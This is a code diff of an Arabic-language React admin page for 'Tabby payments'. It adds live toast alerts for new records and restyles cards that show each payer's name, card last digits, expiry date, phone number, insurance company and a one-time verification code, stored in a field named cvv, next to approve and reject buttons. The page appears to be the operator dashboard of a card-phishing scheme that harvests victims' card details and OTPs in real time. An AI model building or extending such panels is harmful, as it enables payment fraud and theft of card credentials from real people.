@@ -1,13 +1,15 @@
 import { useEffect, useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
-import { Card } from "@/components/ui/card";
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
 import { useNavigate } from "react-router-dom";
 import { AdminSidebar } from "@/components/AdminSidebar";
 import { SidebarProvider } from "@/components/ui/sidebar";
-import { Loader2 } from "lucide-react";
+import { Loader2, CreditCard, Check, X } from "lucide-react";
+import { format } from "date-fns";
+import { ar } from "date-fns/locale";
 
 interface TabbyPayment {
   id: string;
@@ -47,7 +49,23 @@ const AdminTabbyPayments = () => {
       .on(
         'postgres_changes',
         {
-          event: '*',
+          event: 'INSERT',
+          schema: 'public',
+          table: 'tabby_payments'
+        },
+        () => {
+          toast({
+            title: "🔔 طلب دفع تابي جديد!",
+            description: "تم استلام طلب دفع جديد",
+            duration: 10000,
+          });
+          fetchPayments();
+        }
+      )
+      .on(
+        'postgres_changes',
+        {
+          event: 'UPDATE',
           schema: 'public',
           table: 'tabby_payments'
         },
@@ -165,101 +183,119 @@ const AdminTabbyPayments = () => {
       <div className="flex min-h-screen w-full bg-background" dir="rtl">
         <AdminSidebar />
         <div className="flex-1 p-8">
-        <div className="mb-6">
-          <h1 className="text-3xl font-bold">طلبات تابي</h1>
-          <p className="text-muted-foreground">إدارة طلبات الدفع عبر تابي</p>
-        </div>
-
-        {payments.length === 0 ? (
-          <Card className="p-8 text-center">
-            <p className="text-muted-foreground">لا توجد طلبات دفع حتى الآن</p>
-          </Card>
-        ) : (
-          <div className="grid gap-4">
-            {payments.map((payment) => (
-              <Card key={payment.id} className="p-6">
-                <div className="space-y-4">
-                  <div className="flex items-center justify-between">
-                    <div>
-                      <h3 className="text-lg font-semibold">{payment.cardholder_name}</h3>
-                      <p className="text-sm text-muted-foreground">
-                        {new Date(payment.created_at).toLocaleDateString('ar-SA', {
-                          year: 'numeric',
-                          month: 'long',
-                          day: 'numeric',
-                          hour: '2-digit',
-                          minute: '2-digit'
-                        })}
-                      </p>
-                    </div>
-                    {getStatusBadge(payment.payment_status)}
-                  </div>
-
-                  <div className="grid grid-cols-2 gap-4 text-sm">
-                    <div>
-                      <p className="font-medium text-muted-foreground">رقم البطاقة</p>
-                      <p className="font-mono">**** **** **** {payment.card_number_last4}</p>
-                    </div>
-                    <div>
-                      <p className="font-medium text-muted-foreground">تاريخ الانتهاء</p>
-                      <p>{payment.expiry_date}</p>
-                    </div>
-                    <div>
-                      <p className="font-medium text-muted-foreground">المبلغ الإجمالي</p>
-                      <p className="font-semibold">{payment.total_amount.toFixed(2)} ريال</p>
-                    </div>
-                    {payment.company && (
-                      <div>
-                        <p className="font-medium text-muted-foreground">الشركة</p>
-                        <p>{payment.company}</p>
-                      </div>
-                    )}
-                    {payment.phone && (
-                      <div>
-                        <p className="font-medium text-muted-foreground">رقم الهاتف</p>
-                        <p dir="ltr" className="text-right">{payment.phone}</p>
-                      </div>
-                    )}
-                    {payment.cvv && (
-                      <div className="col-span-2">
-                        <p className="font-medium text-muted-foreground">كود التحقق (OTP)</p>
-                        <p className="font-mono text-lg font-bold text-primary">{payment.cvv}</p>
-                      </div>
-                    )}
-                  </div>
-
-                  {payment.payment_status === 'pending' && payment.cvv && (
-                    <div className="flex gap-2 pt-4">
-                      <Button
-                        onClick={() => handleApprove(payment.id)}
-                        disabled={processing === payment.id}
-                        className="flex-1"
-                      >
-                        {processing === payment.id ? (
-                          <Loader2 className="h-4 w-4 animate-spin" />
-                        ) : (
-                          "موافقة"
-                        )}
-                      </Button>
-                      <Button
-                        onClick={() => handleReject(payment.id)}
-                        disabled={processing === payment.id}
-                        variant="destructive"
-                        className="flex-1"
-                      >
-                        {processing === payment.id ? (
-                          <Loader2 className="h-4 w-4 animate-spin" />
-                        ) : (
-                          "رفض"
-                        )}
-                      </Button>
-                    </div>
-                  )}
-                </div>
-              </Card>
-            ))}
+          <div className="mb-6">
+            <h1 className="text-3xl font-bold">طلبات تابي</h1>
+            <p className="text-muted-foreground">إدارة طلبات الدفع عبر تابي - تحديث تلقائي</p>
           </div>
-        )}
+
+          {payments.length === 0 ? (
+            <Card className="p-8 text-center">
+              <p className="text-muted-foreground">لا توجد طلبات دفع حتى الآن</p>
+            </Card>
+          ) : (
+            <div className="grid gap-6">
+              {payments.map((payment) => (
+                <Card key={payment.id} className="overflow-hidden">
+                  <CardHeader className="bg-muted/50 border-b">
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-2">
+                        <CreditCard className="h-5 w-5 text-primary" />
+                        <CardTitle className="text-lg">{payment.cardholder_name}</CardTitle>
+                      </div>
+                      {getStatusBadge(payment.payment_status)}
+                    </div>
+                    <CardDescription className="mt-1">
+                      {format(new Date(payment.created_at), 'PPp', { locale: ar })}
+                    </CardDescription>
+                  </CardHeader>
+
+                  <CardContent className="p-6">
+                    {/* معلومات أساسية */}
+                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
+                      {payment.company && (
+                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
+                          <div className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</div>
+                          <div className="font-bold text-sm text-gray-900 truncate" title={payment.company}>
+                            {payment.company}
+                          </div>
+                        </div>
+                      )}
+                      
+                      {payment.phone && (
+                        <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
+                          <div className="text-xs text-purple-600 font-medium mb-1">رقم الهاتف</div>
+                          <div className="font-bold text-sm text-gray-900" dir="ltr">
+                            {payment.phone}
+                          </div>
+                        </div>
+                      )}
+                      
+                      <div className="bg-orange-50 border border-orange-200 rounded-lg p-3">
+                        <div className="text-xs text-orange-600 font-medium mb-1">رقم البطاقة</div>
+                        <div className="font-mono font-bold text-sm text-gray-900">
+                          **** **** **** {payment.card_number_last4}
+                        </div>
+                      </div>
+
+                      <div className="bg-gray-50 border border-gray-200 rounded-lg p-3">
+                        <div className="text-xs text-gray-600 font-medium mb-1">تاريخ الانتهاء</div>
+                        <div className="font-bold text-sm text-gray-900" dir="ltr">
+                          {payment.expiry_date}
+                        </div>
+                      </div>
+                      
+                      <div className="bg-green-50 border border-green-200 rounded-lg p-3">
+                        <div className="text-xs text-green-600 font-medium mb-1">المبلغ الإجمالي</div>
+                        <div className="font-bold text-lg text-green-700">
+                          {payment.total_amount.toFixed(2)} ر.س
+                        </div>
+                      </div>
+                      
+                      {payment.cvv && (
+                        <div className="bg-primary/10 border-2 border-primary rounded-lg p-3">
+                          <div className="text-xs text-primary font-medium mb-1">كود التحقق (OTP)</div>
+                          <div className="font-bold text-2xl text-primary text-center tracking-widest">
+                            {payment.cvv}
+                          </div>
+                        </div>
+                      )}
+                    </div>
+
+                    {/* أزرار الموافقة والرفض */}
+                    {payment.payment_status === 'pending' && payment.cvv && (
+                      <div className="flex gap-2 pt-4 border-t">
+                        <Button
+                          onClick={() => handleApprove(payment.id)}
+                          disabled={processing === payment.id}
+                          className="flex-1 bg-green-600 hover:bg-green-700 text-white"
+                        >
+                          {processing === payment.id ? (
+                            <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                          ) : (
+                            <Check className="h-4 w-4 ml-2" />
+                          )}
+                          موافقة
+                        </Button>
+                        <Button
+                          onClick={() => handleReject(payment.id)}
+                          disabled={processing === payment.id}
+                          variant="destructive"
+                          className="flex-1"
+                        >
+                          {processing === payment.id ? (
+                            <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                          ) : (
+                            <X className="h-4 w-4 ml-2" />
+                          )}
+                          رفض
+                        </Button>
+                      </div>
+                    )}
+                  </CardContent>
+                </Card>
+              ))}
+            </div>
+          )}
         </div>
       </div>
     </SidebarProvider>
